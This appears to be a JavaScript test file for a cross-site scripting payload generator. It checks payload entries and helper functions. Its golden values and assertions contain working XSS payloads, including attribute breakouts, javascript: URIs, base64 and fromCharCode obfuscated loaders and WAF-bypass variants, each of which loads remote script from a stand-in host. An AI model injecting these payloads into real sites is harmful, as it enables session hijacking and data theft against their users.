const payloads_module = require('../src/libs/payloads.js');

const DOMAIN = 'xss.test';
const { payloads, categories, helpers } = payloads_module;

const ALLOWED_CATEGORY_IDS = ['attribute_breakout', 'uri_based', 'waf_bypass', 'dom_based'];

let passed = 0;

function check(name, condition) {
    if (!condition) {
        throw new Error('FAILED: ' + name);
    }
    passed += 1;
    console.log('ok - ' + name);
}

// Module shape
check('module exports payloads array', Array.isArray(payloads));
check('module exports categories array', Array.isArray(categories));
check('module exports helpers', typeof helpers === 'object' && helpers !== null);

// Categories
check('categories have expected order', categories.map((c) => c.id).join(',') ===
    'attribute_breakout,uri_based,waf_bypass,dom_based,all');
categories.forEach((category) => {
    check('category ' + category.id + ' has label', typeof category.label === 'string' && category.label.length > 0);
});

// Every payload entry is complete
payloads.forEach((payload) => {
    const label = payload.id;
    check(label + ' has id', typeof payload.id === 'string' && payload.id.length > 0);
    check(label + ' has valid category', ALLOWED_CATEGORY_IDS.indexOf(payload.category) !== -1);
    check(label + ' has title', typeof payload.title === 'string' && payload.title.length > 0);
    check(label + ' has description', typeof payload.description === 'string' && payload.description.length > 0);
    check(label + ' func returns string', typeof payload.func === 'function' && typeof payload.func(DOMAIN) === 'string');
    check(label + ' has example', typeof payload.example === 'string' && payload.example.length > 0);
    check(label + ' has caveats', typeof payload.caveats === 'string' && payload.caveats.length > 0);
    check(label + ' has when', typeof payload.when === 'string' && payload.when.length > 0);
});

// Existing payloads preserved (golden values)
const by_id = {};
payloads.forEach((p) => { by_id[p.id] = p; });

check('basic_script golden', by_id.basic_script.func(DOMAIN) ===
    '"><script src="https://xss.test"></script>');
check('jquery_chainload golden', by_id.jquery_chainload.func(DOMAIN) ===
    '<script>$.getScript("https://xss.test")</script>');
check('xmlhttprequest_load golden', by_id.xmlhttprequest_load.func(DOMAIN) ===
    '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://xss.test");a.send();</script>');
check('javascript_uri golden', by_id.javascript_uri.func(DOMAIN) ===
    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://xss.test\\';document.body.appendChild(a)')");
check('input_onfocus golden', by_id.input_onfocus.func(DOMAIN) ===
    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnRlc3QiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>');
check('image_onerror golden', by_id.image_onerror.func(DOMAIN) ===
    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnRlc3QiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>');
check('video_source golden', by_id.video_source.func(DOMAIN) ===
    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnRlc3QiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>');
check('iframe_srcdoc golden', by_id.iframe_srcdoc.func(DOMAIN) ===
    '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.test&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">');

// Helpers behave
check('js_attrib contains domain', helpers.js_attrib(DOMAIN).indexOf('https://xss.test') !== -1);
check('case_mix changes case but not length', (() => {
    const out = helpers.case_mix('onerror');
    return out !== 'onerror' && out.length === 'onerror'.length;
})());
check('entity_encode encodes every char', helpers.entity_encode('"><') === '&#34;&#62;&#60;');
check('from_char_code starts with eval(String.fromCharCode', helpers.from_char_code('x').indexOf('eval(String.fromCharCode(120)') === 0);
check('b64_js round-trips to loader containing domain', (() => {
    const decoded = atob(helpers.b64_js(DOMAIN));
    return decoded.indexOf('https://' + DOMAIN) !== -1;
})());

// The 8 original payload ids exist
['basic_script', 'javascript_uri', 'input_onfocus', 'image_onerror', 'video_source',
    'iframe_srcdoc', 'xmlhttprequest_load', 'jquery_chainload'].forEach((id) => {
    check('original payload exists: ' + id, typeof by_id[id] !== 'undefined');
});

// Task 2 payloads exist and produce sane output
['svg_onload', 'details_ontoggle', 'body_onload', 'marquee_onstart', 'select_autofocus',
    'anchor_javascript', 'meta_refresh', 'object_data', 'iframe_data_uri', 'svg_xlink_href'].forEach((id) => {
    check('task2 payload exists: ' + id, typeof by_id[id] !== 'undefined');
    if (by_id[id]) {
        const out = by_id[id].func(DOMAIN);
        check(id + ' output contains domain', out.indexOf(DOMAIN) !== -1 || out.indexOf(helpers.b64_js(DOMAIN)) !== -1);
        check(id + ' output non-empty', out.length > 0);
    }
});

check('attribute breakouts start with quote-break', ['svg_onload', 'details_ontoggle', 'body_onload', 'marquee_onstart', 'select_autofocus'].every((id) => {
    return by_id[id].func(DOMAIN).indexOf('">') === 0;
}));
check('attribute breakouts use atob loader', ['svg_onload', 'details_ontoggle', 'body_onload', 'marquee_onstart', 'select_autofocus'].every((id) => {
    return by_id[id].func(DOMAIN).indexOf('eval(atob(this.id))') !== -1;
}));
check('uri payloads contain javascript:', ['anchor_javascript', 'meta_refresh', 'object_data', 'svg_xlink_href'].every((id) => {
    return by_id[id].func(DOMAIN).indexOf('javascript:') !== -1;
}));
check('iframe_data_uri is URL-encoded', by_id.iframe_data_uri.func(DOMAIN).indexOf('data:text/html,%3Cscript') !== -1);

// Task 3 payloads exist and produce sane output
['case_mixed_onerror', 'entity_encoded_breakout', 'no_space_onerror', 'protocol_relative_script',
    'from_char_code_loader', 'template_literal_loader', 'jquery_html_sink', 'postmessage_receiver'].forEach((id) => {
    check('task3 payload exists: ' + id, typeof by_id[id] !== 'undefined');
    if (by_id[id]) {
        const out = by_id[id].func(DOMAIN);
        check(id + ' output contains domain', out.indexOf(DOMAIN) !== -1 || out.indexOf(helpers.b64_js(DOMAIN)) !== -1 || out.indexOf(DOMAIN.split('').map((character) => character.charCodeAt(0)).join(',')) !== -1);
        check(id + ' output non-empty', out.length > 0);
    }
});

check('case_mixed_onerror mixes case', (() => {
    const out = by_id.case_mixed_onerror.func(DOMAIN);
    return out !== by_id.image_onerror.func(DOMAIN) && out.indexOf('eval(atob(this.id))') !== -1;
})());
check('entity_encoded_breakout starts with entities', by_id.entity_encoded_breakout.func(DOMAIN).indexOf('&#34;&#62;') === 0);
check('no_space_onerror has no space before onerror', (() => {
    const out = by_id.no_space_onerror.func(DOMAIN);
    return out.indexOf('/onerror=') !== -1 && out.indexOf(' onerror') === -1;
})());
check('protocol_relative_script uses //', by_id.protocol_relative_script.func(DOMAIN).indexOf('//' + DOMAIN) !== -1);
check('from_char_code_loader hides domain as char codes', (() => {
    const out = by_id.from_char_code_loader.func(DOMAIN);
    return out.indexOf('String.fromCharCode(') !== -1 && out.indexOf('https://' + DOMAIN) === -1;
})());
check('template_literal_loader uses backticks', by_id.template_literal_loader.func(DOMAIN).indexOf('`') !== -1);
check('jquery_html_sink has no quote-break prefix', (() => {
    const out = by_id.jquery_html_sink.func(DOMAIN);
    return out.indexOf('">') !== 0 && out.indexOf('<img') === 0;
})());
check('postmessage_receiver listens for messages', by_id.postmessage_receiver.func(DOMAIN).indexOf("addEventListener('message'") !== -1);

console.log('All ' + passed + ' checks passed.');
